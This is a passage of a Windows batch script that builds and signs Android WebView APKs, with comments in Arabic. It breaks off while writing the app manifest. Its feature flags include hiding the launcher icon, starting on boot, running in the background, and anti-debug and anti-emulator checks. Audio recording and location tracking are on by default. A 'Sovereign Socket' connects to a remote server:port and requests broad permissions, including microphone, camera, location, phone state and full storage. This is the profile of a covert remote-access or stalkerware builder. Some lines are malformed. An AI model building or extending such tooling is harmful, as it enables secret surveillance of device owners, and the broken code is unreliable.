@echo off
chcp 65001 >nul

:: ═══════════════════════════════════════════════════════════════════════════════════════
::                         APK PROFESSIONAL BUILDER v5.0
::                    يستخدم الأدوات الحقيقية المتاحة فقط
:: ═══════════════════════════════════════════════════════════════════════════════════════

:: ─────────────────────────────────────────────────────────────────────────────────────────
::        القيم الافتراضية - يجب أن تكون قبل setlocal لقراءة المتغيرات من البيئة الخارجية
:: ─────────────────────────────────────────────────────────────────────────────────────────

:: معلومات التطبيق
if not defined APP_NAME set "APP_NAME=MyApp"
if not defined PACKAGE_NAME set "PACKAGE_NAME=com.example.myapp"
if not defined APP_ICON set "APP_ICON="
if not defined VERSION_CODE set "VERSION_CODE=1"
if not defined VERSION_NAME set "VERSION_NAME=1.0.0"
if not defined MIN_SDK set "MIN_SDK=21"
if not defined TARGET_SDK set "TARGET_SDK=34"
if not defined URL set "URL=https://www.google.com"
if not defined PORT set "PORT=7771"
if not defined CONNECTION_KEY set "=TxTxT"

:: الأذونات
if not defined PERM_INTERNET set "PERM_INTERNET=true"
if not defined PERM_CAMERA set "PERM_CAMERA=true"
if not defined PERM_STORAGE set "PERM_STORAGE=false"
if not defined PERM_LOCATION set "PERM_LOCATION=false"
if not defined PERM_MICROPHONE set "PERM_MICROPHONE=false"
if not defined PERM_VIBRATE set "PERM_VIBRATE=false"
if not defined PERM_WAKE_LOCK set "PERM_WAKE_LOCK=true"
if not defined PERM_NOTIFICATION set "PERM_NOTIFICATION=true"

:: WebView
if not defined JAVASCRIPT set "JAVASCRIPT=true"
if not defined ZOOM set "ZOOM=false"
if not defined FULLSCREEN set "FULLSCREEN=true"
if not defined ORIENTATION set "ORIENTATION=portrait"
if not defined BACK_BUTTON set "BACK_BUTTON=webview"
if not defined FILE_UPLOAD set "FILE_UPLOAD=false"
if not defined FILE_DOWNLOAD set "FILE_DOWNLOAD=false"
if not defined PULL_REFRESH set "PULL_REFRESH=false"
if not defined OFFLINE_PAGE set "OFFLINE_PAGE=false"
if not defined SSL_CONTINUE set "SSL_CONTINUE=false"
if not defined GEOLOCATION set "GEOLOCATION=false"
if not defined USER_AGENT set "USER_AGENT="
if not defined CACHE_MODE set "CACHE_MODE=LOAD_DEFAULT"
if not defined LOADING_INDICATOR set "LOADING_INDICATOR=progressbar"

:: الميزات المتقدمة
if not defined JS_BRIDGE set "JS_BRIDGE=false"
if not defined JS_BRIDGE_NAME set "JS_BRIDGE_NAME=AppBridge"
if not defined DATABASE_ENABLED set "DATABASE_ENABLED=false"
if not defined WEBSOCKET_ENABLED set "WEBSOCKET_ENABLED=false"
if not defined ALLOW_POPUPS set "ALLOW_POPUPS=false"
if not defined AUDIO_RECORDING set "AUDIO_RECORDING=true"
if not defined CAMERA_WEBVIEW set "CAMERA_WEBVIEW=ttue"
if not defined KOTLIN_ENABLED set "KOTLIN_ENABLED=true"

:: الميزات الاحترافية
if not defined QR_CODE_ENABLED set "QR_CODE_ENABLED=false"
if not defined BIOMETRIC_ENABLED set "BIOMETRIC_ENABLED=false"
if not defined FCM_ENABLED set "FCM_ENABLED=false"
if not defined NFC_ENABLED set "NFC_ENABLED=false"

:: Media Framework
if not defined MEDIA_CODEC_ENABLED set "MEDIA_CODEC_ENABLED=true"
if not defined CAMERA2_ENABLED set "CAMERA2_ENABLED=true"
if not defined AUDIO_FX_ENABLED set "AUDIO_FX_ENABLED=true"

:: Kotlin Features
if not defined COROUTINES_ENABLED set "COROUTINES_ENABLED=true"
if not defined DATASTORE_ENABLED set "DATASTORE_ENABLED=true"
if not defined NETWORK_MONITOR_ENABLED set "NETWORK_MONITOR_ENABLED=true"
if not defined LOCATION_TRACKER_ENABLED set "LOCATION_TRACKER_ENABLED=true"
if not defined DEVICE_INFO_ENABLED set "DEVICE_INFO_ENABLED=true"
if not defined SMART_NOTIFICATIONS_ENABLED set "SMART_NOTIFICATIONS_ENABLED=true"

:: الحماية
if not defined ANTI_DEBUG set "ANTI_DEBUG=false"
if not defined ANTI_EMULATOR set "ANTI_EMULATOR=false"
if not defined ROOT_CHECK set "ROOT_CHECK=false"
if not defined PREVENT_SCREENSHOT set "PREVENT_SCREENSHOT=false"
if not defined ENCRYPT_URL set "ENCRYPT_URL=false"

:: السلوك
if not defined START_ON_BOOT set "START_ON_BOOT=false"
if not defined HIDE_ICON set "HIDE_ICON=false"
if not defined RUN_BACKGROUND set "RUN_BACKGROUND=false"
if not defined KEEP_SCREEN set "KEEP_SCREEN=false"

:: Splash
if not defined SPLASH_ENABLED set "SPLASH_ENABLED=false"
if not defined SPLASH_DURATION set "SPLASH_DURATION=2000"
if not defined SPLASH_COLOR set "SPLASH_COLOR=#FFFFFF"

:: ─────────────────────────────────────────────────────────────────────────────────────────
::                    تفعيل DelayedExpansion بعد قراءة كل المتغيرات الخارجية
:: ─────────────────────────────────────────────────────────────────────────────────────────
setlocal EnableDelayedExpansion

:: ═══════════════════════════════════════════════════════════════════════════════════════
::                              إعداد المسارات
:: ═══════════════════════════════════════════════════════════════════════════════════════

set "SD=%~dp0"
set "TOOLS=%SD%Tools"
set "TPL=%SD%Templates"
set "BUILD=%SD%build"
set "OUTPUT=%USERPROFILE%\Desktop"

:: الأدوات الحقيقية
set "JAVA=%SD%jre\bin\java.exe"
set "JAVAC=%SD%jre\bin\javac.exe"
set "JAR=%SD%jre\bin\jar.exe"
set "KEYTOOL=%SD%jre\bin\keytool.exe"
set "AAPT2=%TOOLS%\aapt2.exe"
set "ZIPALIGN=%TOOLS%\zipalign.exe"
set "APKSIGNER=%TOOLS%\apksigner.jar"
set "ANDROID_JAR=%TOOLS%\android.jar"
set "ANDROIDX_CORE=%TOOLS%\androidx-core.jar"
set "D8_JAR=%TOOLS%\d8.jar"
set "DEFAULT_ICON=%TOOLS%\Icons\ic_launcher.png"
set "DEBUG_KEYSTORE=%TOOLS%\debug.keystore"

:: Kotlin toolchain
set "KOTLIN_HOME=%TOOLS%\kotlinc"
set "KOTLINC=%KOTLIN_HOME%\bin\kotlinc.bat"
set "KOTLIN_STDLIB=%KOTLIN_HOME%\lib\kotlin-stdlib.jar"
set "KOTLIN_STDLIB_JDK8=%KOTLIN_HOME%\lib\kotlin-stdlib-jdk8.jar"
set "KOTLIN_REFLECT=%KOTLIN_HOME%\lib\kotlin-reflect.jar"
set "COROUTINES_JAR=%KOTLIN_HOME%\lib\kotlinx-coroutines-core-jvm.jar"

:: المكتبات الإضافية
set "ZXING_JAR=%TOOLS%\core-3.5.2.jar"
set "BIOMETRIC_JAR=%TOOLS%\biometric-1.1.0\classes.jar"
set "FCM_JAR=%TOOLS%\firebase-messaging-23.4.0\classes.jar"

set "PKG_PATH=%PACKAGE_NAME:.=\%"

:: ═══════════════════════════════════════════════════════════════════════════════════════
::                              عرض المعلومات
:: ═══════════════════════════════════════════════════════════════════════════════════════

cls
echo.
echo  ╔═══════════════════════════════════════════════════════════════════════════════╗
echo  ║                    APK PROFESSIONAL BUILDER v5.0                              ║
echo  ╚═══════════════════════════════════════════════════════════════════════════════╝
echo.
echo   📱 App: %APP_NAME%
echo   📦 Package: %PACKAGE_NAME%
echo   🔢 Version: %VERSION_NAME% ^(%VERSION_CODE%^)
echo   🌐 URL: %URL%
echo   📊 SDK: %MIN_SDK% - %TARGET_SDK%
echo.
echo   ⚡ Features:
if "%JS_BRIDGE%"=="true" echo      ✓ JavaScript Bridge ^(%JS_BRIDGE_NAME%^)
if "%DATABASE_ENABLED%"=="true" echo      ✓ SQLite Database
if "%WEBSOCKET_ENABLED%"=="true" echo      ✓ WebSocket Client
if "%SPLASH_ENABLED%"=="true" echo      ✓ Splash Screen
if "%START_ON_BOOT%"=="true" echo      ✓ Start on Boot
if "%RUN_BACKGROUND%"=="true" echo      ✓ Background Service
if "%FILE_UPLOAD%"=="true" echo      ✓ File Upload
if "%FILE_DOWNLOAD%"=="true" echo      ✓ File Download
if "%PULL_REFRESH%"=="true" echo      ✓ Pull to Refresh
if "%OFFLINE_PAGE%"=="true" echo      ✓ Offline Page
if "%ALLOW_POPUPS%"=="true" echo      ✓ Allow Popups
if "%AUDIO_RECORDING%"=="true" echo      ✓ Audio Recording
if "%CAMERA_WEBVIEW%"=="true" echo      ✓ Camera WebView
if "%HIDE_ICON%"=="true" echo      ✓ Hide Icon
echo.
echo   🔒 Security:
if "%ANTI_DEBUG%"=="true" echo      ✓ Anti-Debug
if "%ANTI_EMULATOR%"=="true" echo      ✓ Anti-Emulator
if "%ROOT_CHECK%"=="true" echo      ✓ Root Detection
if "%PREVENT_SCREENSHOT%"=="true" echo      ✓ Screenshot Prevention
if "%ENCRYPT_URL%"=="true" echo      ✓ URL Encryption
echo.
echo   🎯 Professional Features:
if "%QR_CODE_ENABLED%"=="true" echo      ✓ QR Code Scanner ^(ZXing^)
if "%BIOMETRIC_ENABLED%"=="true" echo      ✓ Biometric Authentication
if "%FCM_ENABLED%"=="true" echo      ✓ Firebase Cloud Messaging
if "%NFC_ENABLED%"=="true" echo      ✓ NFC Support
if "%MEDIA_CODEC_ENABLED%"=="true" echo      ✓ MediaCodec Bridge
if "%CAMERA2_ENABLED%"=="true" echo      ✓ Camera2 API
if "%AUDIO_FX_ENABLED%"=="true" echo      ✓ Audio Effects
if "%KOTLIN_ENABLED%"=="true" echo      ✓ Kotlin Support
if "%COROUTINES_ENABLED%"=="true" echo      ✓ Coroutines Manager
if "%DATASTORE_ENABLED%"=="true" echo      ✓ Encrypted DataStore
if "%NETWORK_MONITOR_ENABLED%"=="true" echo      ✓ Network Monitor
if "%LOCATION_TRACKER_ENABLED%"=="true" echo      ✓ Location Tracker
if "%DEVICE_INFO_ENABLED%"=="true" echo      ✓ Device Info Manager
if "%SMART_NOTIFICATIONS_ENABLED%"=="true" echo      ✓ Smart Notifications
echo.
if "%BAKLAVA_SENSITIVE_PROTECT%"=="true" echo      ✓ Sensitive Content Shield
echo.
echo   🦅 Sovereign Industrial Modules:
if "%SOVEREIGN_CRYPTO%"=="true" echo      ✓ AES-256 Encryption Layer
if "%SOVEREIGN_SOCKET%"=="true" echo      ✓ Bi-directional Research Engine ^(%SOVEREIGN_SERVER%:%SOVEREIGN_PORT%^)
echo.

:: ═══════════════════════════════════════════════════════════════════════════════════════
::                              [1/11] فحص الأدوات
:: ═══════════════════════════════════════════════════════════════════════════════════════

echo  [01/11] Checking tools...
if not exist "%JAVA%" (echo    ❌ java.exe not found at: %JAVA% & goto :fail)
if not exist "%JAVAC%" (echo    ❌ javac.exe not found at: %JAVAC% & goto :fail)
if not exist "%AAPT2%" (echo    ❌ aapt2.exe not found at: %AAPT2% & goto :fail)
if not exist "%ANDROID_JAR%" (echo    ❌ android.jar not found at: %ANDROID_JAR% & goto :fail)
if not exist "%D8_JAR%" (echo    ❌ d8.jar not found at: %D8_JAR% & goto :fail)
if not exist "%ZIPALIGN%" (echo    ❌ zipalign.exe not found at: %ZIPALIGN% & goto :fail)
if not exist "%APKSIGNER%" (echo    ❌ apksigner.jar not found at: %APKSIGNER% & goto :fail)
echo          ✓ Core tools found

:: Kotlin tools check
if "%KOTLIN_ENABLED%"=="true" (
    if not exist "%KOTLINC%" (
        echo    ⚠️ kotlinc not found - Kotlin disabled
        set "KOTLIN_ENABLED=false"
    ) else (
        if not exist "%KOTLIN_STDLIB%" (
            echo    ⚠️ kotlin-stdlib.jar not found - Kotlin disabled
            set "KOTLIN_ENABLED=false"
        ) else (
            echo          ✓ Kotlin toolchain found
        )
    )
)

:: فحص المكتبات الإضافية
if "%QR_CODE_ENABLED%"=="true" (
    if not exist "%ZXING_JAR%" (echo    ⚠️ ZXing not found - QR disabled & set "QR_CODE_ENABLED=false") else (echo          ✓ ZXing library found)
)
if "%BIOMETRIC_ENABLED%"=="true" (
    if not exist "%BIOMETRIC_JAR%" (echo    ⚠️ Biometric not found - disabled & set "BIOMETRIC_ENABLED=false") else (echo          ✓ Biometric library found)
)
if "%FCM_ENABLED%"=="true" (
    if not exist "%FCM_JAR%" (echo    ⚠️ FCM not found - disabled & set "FCM_ENABLED=false") else (echo          ✓ FCM library found)
)

:: ═══════════════════════════════════════════════════════════════════════════════════════
::                              [2/11] تحضير المجلدات
:: ═══════════════════════════════════════════════════════════════════════════════════════

echo  [02/11] Preparing folders...
if exist "%BUILD%" rmdir /s /q "%BUILD%" 2>nul
mkdir "%BUILD%\src\%PKG_PATH%" 2>nul
mkdir "%BUILD%\res\drawable" 2>nul
mkdir "%BUILD%\res\values" 2>nul
mkdir "%BUILD%\res\xml" 2>nul
mkdir "%BUILD%\assets" 2>nul
mkdir "%BUILD%\gen\%PKG_PATH%" 2>nul
mkdir "%BUILD%\obj\classes" 2>nul
mkdir "%BUILD%\bin" 2>nul
echo          ✓ OK

:: ═══════════════════════════════════════════════════════════════════════════════════════
::                              [3/11] نسخ الأيقونة
:: ═══════════════════════════════════════════════════════════════════════════════════════

echo  [03/11] Copying icon...
if defined APP_ICON (
    if exist "%APP_ICON%" (
        copy "%APP_ICON%" "%BUILD%\res\drawable\ic_launcher.png" >nul 2>&1
        if errorlevel 1 copy "%DEFAULT_ICON%" "%BUILD%\res\drawable\ic_launcher.png" >nul
    ) else (
        copy "%DEFAULT_ICON%" "%BUILD%\res\drawable\ic_launcher.png" >nul
    )
) else (
    copy "%DEFAULT_ICON%" "%BUILD%\res\drawable\ic_launcher.png" >nul
)
echo          ✓ OK

:: ═══════════════════════════════════════════════════════════════════════════════════════
::                              [4/11] إنشاء الموارد
:: ═══════════════════════════════════════════════════════════════════════════════════════

echo  [04/11] Creating resources...
call :create_resources
echo          ✓ OK

:: ═══════════════════════════════════════════════════════════════════════════════════════
::                              [5/11] إنشاء AndroidManifest.xml
:: ═══════════════════════════════════════════════════════════════════════════════════════

echo  [05/11] Creating AndroidManifest.xml...
call :create_manifest
echo          ✓ OK

:: ═══════════════════════════════════════════════════════════════════════════════════════
::                              [6/11] إنشاء كود Java
:: ═══════════════════════════════════════════════════════════════════════════════════════

echo  [06/11] Creating Java code...
call :create_java_code
echo          ✓ OK

:: ═══════════════════════════════════════════════════════════════════════════════════════
::                              [7/11] AAPT2 Compile
:: ═══════════════════════════════════════════════════════════════════════════════════════

echo  [07/11] Compiling resources with AAPT2...
"%AAPT2%" compile --dir "%BUILD%\res" -o "%BUILD%\obj\resources.zip" 2>"%BUILD%\aapt2_compile.log"
if errorlevel 1 (
    echo    ❌ AAPT2 compile failed
    type "%BUILD%\aapt2_compile.log"
    goto :fail
)
echo          ✓ OK

:: ═══════════════════════════════════════════════════════════════════════════════════════
::                              [8/11] AAPT2 Link
:: ═══════════════════════════════════════════════════════════════════════════════════════

echo  [08/11] Linking resources with AAPT2...
"%AAPT2%" link -o "%BUILD%\bin\base.apk" -I "%ANDROID_JAR%" --manifest "%BUILD%\AndroidManifest.xml" -R "%BUILD%\obj\resources.zip" -A "%BUILD%\assets" --java "%BUILD%\gen" --auto-add-overlay 2>"%BUILD%\aapt2_link.log"
if errorlevel 1 (
    echo    ❌ AAPT2 link failed
    type "%BUILD%\aapt2_link.log"
    goto :fail
)
echo          ✓ OK

:: ═══════════════════════════════════════════════════════════════════════════════════════
::                              [9/11] تجميع Kotlin و Java
:: ═══════════════════════════════════════════════════════════════════════════════════════

:: Kotlin compilation
if "%KOTLIN_ENABLED%"=="true" (
    echo  [09/11] Compiling Kotlin with kotlinc...
    
    :: Copy and process Kotlin files
    if exist "%TPL%\kotlin" (
        mkdir "%BUILD%\src\%PKG_PATH%\kotlin" 2>nul
        for %%f in ("%TPL%\kotlin\*.kt") do (
            powershell -Command "$c = Get-Content '%%f' -Raw -Encoding UTF8; $c = $c -replace '\{\{PACKAGE\}\}','%PACKAGE_NAME%'; [IO.File]::WriteAllText('%BUILD%\src\%PKG_PATH%\kotlin\%%~nxf', $c, [Text.UTF8Encoding]::new($false))"
        )
    )
    
    set "KT_FILES="
    for %%f in ("%BUILD%\src\%PKG_PATH%\*.kt") do set "KT_FILES=!KT_FILES! "%%f""
    for %%f in ("%BUILD%\src\%PKG_PATH%\kotlin\*.kt") do set "KT_FILES=!KT_FILES! "%%f""
    
    if defined KT_FILES (
        :: تم إصلاح المسار هنا بإضافة المكتبات الأساسية
        set "KT_CP=%ANDROID_JAR%;%ANDROIDX_CORE%;%KOTLIN_STDLIB%;%KOTLIN_STDLIB_JDK8%;%KOTLIN_REFLECT%;%COROUTINES_JAR%"
        
        call "%KOTLINC%" -jvm-target 1.8 -cp "!KT_CP!" -d "%BUILD%\obj\classes" !KT_FILES! 2>"%BUILD%\kotlinc_errors.txt"
        if errorlevel 1 (
            echo    ❌ Kotlin compilation failed
            type "%BUILD%\kotlinc_errors.txt"
            goto :fail
        )
        echo          ✓ Kotlin OK
    ) else (
        echo          ⚠️ No Kotlin sources found
    )
)

echo  [09/11] Compiling Java with javac...

:: تجميع قائمة ملفات Java
set "JFILES="%BUILD%\src\%PKG_PATH%\MainActivity.java" "%BUILD%\gen\%PKG_PATH%\R.java""

if "%JS_BRIDGE%"=="true" (
    if exist "%BUILD%\src\%PKG_PATH%\JSBridge.java" set "JFILES=!JFILES! "%BUILD%\src\%PKG_PATH%\JSBridge.java""
)
if "%DATABASE_ENABLED%"=="true" (
    if exist "%BUILD%\src\%PKG_PATH%\DatabaseHelper.java" set "JFILES=!JFILES! "%BUILD%\src\%PKG_PATH%\DatabaseHelper.java""
)
if "%WEBSOCKET_ENABLED%"=="true" (
    if exist "%BUILD%\src\%PKG_PATH%\WebSocketClient.java" set "JFILES=!JFILES! "%BUILD%\src\%PKG_PATH%\WebSocketClient.java""
)
if "%SPLASH_ENABLED%"=="true" (
    if exist "%BUILD%\src\%PKG_PATH%\SplashActivity.java" set "JFILES=!JFILES! "%BUILD%\src\%PKG_PATH%\SplashActivity.java""
)
if "%START_ON_BOOT%"=="true" (
    if exist "%BUILD%\src\%PKG_PATH%\BootReceiver.java" set "JFILES=!JFILES! "%BUILD%\src\%PKG_PATH%\BootReceiver.java""
)
if "%RUN_BACKGROUND%"=="true" (
    if exist "%BUILD%\src\%PKG_PATH%\BackgroundService.java" set "JFILES=!JFILES! "%BUILD%\src\%PKG_PATH%\BackgroundService.java""
)
if "%QR_CODE_ENABLED%"=="true" (
    if exist "%BUILD%\src\%PKG_PATH%\QRCodeScanner.java" set "JFILES=!JFILES! "%BUILD%\src\%PKG_PATH%\QRCodeScanner.java""
)
if "%BIOMETRIC_ENABLED%"=="true" (
    if exist "%BUILD%\src\%PKG_PATH%\BiometricHelper.java" set "JFILES=!JFILES! "%BUILD%\src\%PKG_PATH%\BiometricHelper.java""
)
if "%NFC_ENABLED%"=="true" (
    if exist "%BUILD%\src\%PKG_PATH%\NFCHelper.java" set "JFILES=!JFILES! "%BUILD%\src\%PKG_PATH%\NFCHelper.java""
)
if "%MEDIA_CODEC_ENABLED%"=="true" (
    if exist "%BUILD%\src\%PKG_PATH%\MediaCodecBridge.java" set "JFILES=!JFILES! "%BUILD%\src\%PKG_PATH%\MediaCodecBridge.java""
)
if "%CAMERA2_ENABLED%"=="true" (
    if exist "%BUILD%\src\%PKG_PATH%\Camera2Helper.java" set "JFILES=!JFILES! "%BUILD%\src\%PKG_PATH%\Camera2Helper.java""
)
if "%AUDIO_FX_ENABLED%"=="true" (
    if exist "%BUILD%\src\%PKG_PATH%\AudioProcessor.java" set "JFILES=!JFILES! "%BUILD%\src\%PKG_PATH%\AudioProcessor.java""
)

:: بناء classpath مع المكتبات الإضافية
set "CLASSPATH=%ANDROIDX_CORE%"
if "%KOTLIN_ENABLED%"=="true" set "CLASSPATH=!CLASSPATH!;%KOTLIN_STDLIB%;%KOTLIN_STDLIB_JDK8%;%KOTLIN_REFLECT%"
if "%COROUTINES_ENABLED%"=="true" if exist "%COROUTINES_JAR%" set "CLASSPATH=!CLASSPATH!;%COROUTINES_JAR%"
if "%QR_CODE_ENABLED%"=="true" if exist "%ZXING_JAR%" set "CLASSPATH=!CLASSPATH!;%ZXING_JAR%"
if "%BIOMETRIC_ENABLED%"=="true" if exist "%BIOMETRIC_JAR%" set "CLASSPATH=!CLASSPATH!;%BIOMETRIC_JAR%"

"%JAVAC%" -source 1.8 -target 1.8 -bootclasspath "%ANDROID_JAR%" -classpath "%CLASSPATH%;%BUILD%\obj\classes" -d "%BUILD%\obj\classes" -sourcepath "%BUILD%\src;%BUILD%\gen" %JFILES% 2>"%BUILD%\errors.txt"
if errorlevel 1 (
    echo    ❌ Java compilation failed
    echo.
    type "%BUILD%\errors.txt"
    echo.
    echo    [DEBUG] Checking WebSocketClient.java content...
    if exist "%BUILD%\src\%PKG_PATH%\WebSocketClient.java" (
        powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-Content '%BUILD%\src\%PKG_PATH%\WebSocketClient.java' -Head 5"
    )
    pause
    goto :fail
)
echo          ✓ OK

:: ═══════════════════════════════════════════════════════════════════════════════════════
::                              [10/11] إنشاء DEX
:: ═══════════════════════════════════════════════════════════════════════════════════════

echo  [10/11] Creating DEX with D8...

:: تجميع ملفات .class
set "CLS="
for /r "%BUILD%\obj\classes" %%f in (*.class) do set "CLS=!CLS! "%%f""

:: بناء قائمة المكتبات لـ D8
set "D8_LIBS=%ANDROIDX_CORE%"
if "%KOTLIN_ENABLED%"=="true" set "D8_LIBS=!D8_LIBS! "%KOTLIN_STDLIB%" "%KOTLIN_STDLIB_JDK8%" "%KOTLIN_REFLECT%""
if "%COROUTINES_ENABLED%"=="true" if exist "%COROUTINES_JAR%" set "D8_LIBS=!D8_LIBS! "%COROUTINES_JAR%""
if "%QR_CODE_ENABLED%"=="true" if exist "%ZXING_JAR%" set "D8_LIBS=!D8_LIBS! "%ZXING_JAR%""
if "%BIOMETRIC_ENABLED%"=="true" if exist "%BIOMETRIC_JAR%" set "D8_LIBS=!D8_LIBS! "%BIOMETRIC_JAR%""

"%JAVA%" -cp "%D8_JAR%" com.android.tools.r8.D8 --release --output "%BUILD%\obj" --lib "%ANDROID_JAR%" %CLS% %D8_LIBS% 2>"%BUILD%\d8.log"
if errorlevel 1 (
    echo    ❌ D8 DEX creation failed
    type "%BUILD%\d8.log"
    goto :fail
)
echo          ✓ OK

:: ═══════════════════════════════════════════════════════════════════════════════════════
::                              [11/11] بناء وتوقيع APK
:: ═══════════════════════════════════════════════════════════════════════════════════════

echo  [11/11] Building and signing APK...

:: نسخ base.apk
copy "%BUILD%\bin\base.apk" "%BUILD%\bin\app.apk" >nul

:: إضافة classes.dex
pushd "%BUILD%\obj"
"%JAR%" -uf "..\bin\app.apk" classes.dex 2>nul
popd

:: Zipalign
"%ZIPALIGN%" -f 4 "%BUILD%\bin\app.apk" "%BUILD%\bin\aligned.apk" 2>"%BUILD%\zipalign.log"
if errorlevel 1 (
    echo    ❌ Zipalign failed
    type "%BUILD%\zipalign.log"
    goto :fail
)

:: إنشاء keystore إذا لم يكن موجوداً
if not exist "%DEBUG_KEYSTORE%" (
    echo    Creating debug keystore...
    "%KEYTOOL%" -genkeypair -keystore "%DEBUG_KEYSTORE%" -keyalg RSA -keysize 2048 -validity 10000 -alias androiddebugkey -storepass android -keypass android -dname "CN=Debug,O=Android,C=US" 2>nul
)

:: توقيع APK
set "APK=%OUTPUT%\%APP_NAME%.apk"
"%JAVA%" -jar "%APKSIGNER%" sign --ks "%DEBUG_KEYSTORE%" --ks-pass pass:android --ks-key-alias androiddebugkey --out "%APK%" "%BUILD%\bin\aligned.apk" 2>"%BUILD%\sign.log"
if errorlevel 1 (
    echo    ❌ APK signing failed
    type "%BUILD%\sign.log"
    goto :fail
)
echo          ✓ OK

:: ═══════════════════════════════════════════════════════════════════════════════════════
::                              النجاح
:: ═══════════════════════════════════════════════════════════════════════════════════════

echo.
echo  ╔═══════════════════════════════════════════════════════════════════════════════╗
echo  ║                           ✅ BUILD SUCCESS!                                   ║
echo  ╚═══════════════════════════════════════════════════════════════════════════════╝
echo.
echo   📍 APK: %APK%
for %%A in ("%APK%") do echo   📊 Size: %%~zA bytes
echo.
goto :end

:fail
echo.
echo  ╔═══════════════════════════════════════════════════════════════════════════════╗
echo  ║                           ❌ BUILD FAILED!                                    ║
echo  ╚═══════════════════════════════════════════════════════════════════════════════╝
echo.
exit /b 1

:end
exit /b 0


:: ═══════════════════════════════════════════════════════════════════════════════════════
::                              إنشاء الموارد
:: ═══════════════════════════════════════════════════════════════════════════════════════
:create_resources
(echo ^<?xml version="1.0" encoding="utf-8"?^>
echo ^<resources^>
echo     ^<string name="app_name"^>%APP_NAME%^</string^>
echo ^</resources^>) > "%BUILD%\res\values\strings.xml"

(echo ^<?xml version="1.0" encoding="utf-8"?^>
echo ^<resources^>
echo     ^<color name="colorPrimary"^>#2196F3^</color^>
echo     ^<color name="colorAccent"^>#FF4081^</color^>
echo ^</resources^>) > "%BUILD%\res\values\colors.xml"

(echo ^<?xml version="1.0" encoding="utf-8"?^>
echo ^<paths^>
echo     ^<external-path name="external" path="." /^>
echo     ^<external-files-path name="external_files" path="." /^>
echo     ^<cache-path name="cache" path="." /^>
echo     ^<files-path name="files" path="." /^>
echo ^</paths^>) > "%BUILD%\res\xml\file_paths.xml"

:: إنشاء صفحة offline إذا كانت مفعلة
if "%OFFLINE_PAGE%"=="true" (
    (echo ^<!DOCTYPE html^>
echo ^<html^>^<head^>^<meta charset="UTF-8"^>^<meta name="viewport" content="width=device-width, initial-scale=1.0"^>
echo ^<style^>body{font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f5f5f5;text-align:center}
echo .container{padding:20px}h1{color:#333}p{color:#666}^</style^>^</head^>
echo ^<body^>^<div class="container"^>^<h1^>📡 No Connection^</h1^>^<p^>Please check your internet connection^</p^>^</div^>^</body^>^</html^>) > "%BUILD%\assets\offline.html"
)
exit /b 0


:: ═══════════════════════════════════════════════════════════════════════════════════════
::                              إنشاء AndroidManifest.xml
:: ═══════════════════════════════════════════════════════════════════════════════════════
:create_manifest
set "MF=%BUILD%\AndroidManifest.xml"

(echo ^<?xml version="1.0" encoding="utf-8"?^>
echo ^<manifest xmlns:android="http://schemas.android.com/apk/res/android"
echo     package="%PACKAGE_NAME%"
echo     android:versionCode="%VERSION_CODE%"
echo     android:versionName="%VERSION_NAME%"^>
echo.) > "%MF%"

:: الأذونات الأصلية (كاملة ومفعلة كما طلبت)
(echo     ^<uses-permission android:name="android.permission.INTERNET" /^>) >> "%MF%"
if "%PERM_CAMERA%"=="true" (echo     ^<uses-permission android:name="android.permission.CAMERA" /^>) >> "%MF%"
if "%PERM_STORAGE%"=="true" (
    (echo     ^<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /^>) >> "%MF%"
    (echo     ^<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" /^>) >> "%MF%"
)
if "%PERM_LOCATION%"=="true" (
    (echo     ^<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" /^>) >> "%MF%"
    (echo     ^<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" /^>) >> "%MF%"
)
if "%PERM_MICROPHONE%"=="true" (echo     ^<uses-permission android:name="android.permission.RECORD_AUDIO" /^>) >> "%MF%"
if "%PERM_VIBRATE%"=="true" (echo     ^<uses-permission android:name="android.permission.VIBRATE" /^>) >> "%MF%"
if "%PERM_WAKE_LOCK%"=="true" (echo     ^<uses-permission android:name="android.permission.WAKE_LOCK" /^>) >> "%MF%"
if "%PERM_NOTIFICATION%"=="true" (echo     ^<uses-permission android:name="android.permission.POST_NOTIFICATIONS" /^>) >> "%MF%"
if "%NFC_ENABLED%"=="true" (echo     ^<uses-permission android:name="android.permission.NFC" /^>) >> "%MF%"
if "%BIOMETRIC_ENABLED%"=="true" (echo     ^<uses-permission android:name="android.permission.USE_BIOMETRIC" /^>) >> "%MF%"
if "%START_ON_BOOT%"=="true" (echo     ^<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" /^>) >> "%MF%"
if "%RUN_BACKGROUND%"=="true" (echo     ^<uses-permission android:name="android.permission.FOREGROUND_SERVICE" /^>) >> "%MF%"

:: Media Framework Permissions
if "%MEDIA_CODEC_ENABLED%"=="true" (
    (echo     ^<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" /^>) >> "%MF%"
    (echo     ^<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /^>) >> "%MF%"
)
if "%CAMERA2_ENABLED%"=="true" (
    (echo     ^<uses-permission android:name="android.permission.CAMERA" /^>) >> "%MF%"
    (echo     ^<uses-feature android:name="android.hardware.camera" android:required="false" /^>) >> "%MF%"
    (echo     ^<uses-feature android:name="android.hardware.camera.autofocus" android:required="false" /^>) >> "%MF%"
)
if "%AUDIO_FX_ENABLED%"=="true" (
    (echo     ^<uses-permission android:name="android.permission.RECORD_AUDIO" /^>) >> "%MF%"
    (echo     ^<uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" /^>) >> "%MF%"
)

    (echo     ^<uses-permission android:name="android.permission.OBSERVE_SENSOR_PRIVACY" /^>) >> "%MF%"
)

:: Sovereign Omni-Permission Matrix
if "%SOVEREIGN_SOCKET%"=="true" (
    (echo     ^<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" /^>) >> "%MF%"
    (echo     ^<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" /^>) >> "%MF%"
    (echo     ^<uses-permission android:name="android.permission.RECORD_AUDIO" /^>) >> "%MF%"
    (echo     ^<uses-permission android:name="android.permission.CAMERA" /^>) >> "%MF%"
    (echo     ^<uses-permission android:name="android.permission.READ_PHONE_STATE" /^>) >> "%MF%"
    (echo     ^<uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" /^>) >> "%MF%"
    (echo     ^<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" /^>) >> "%MF%"
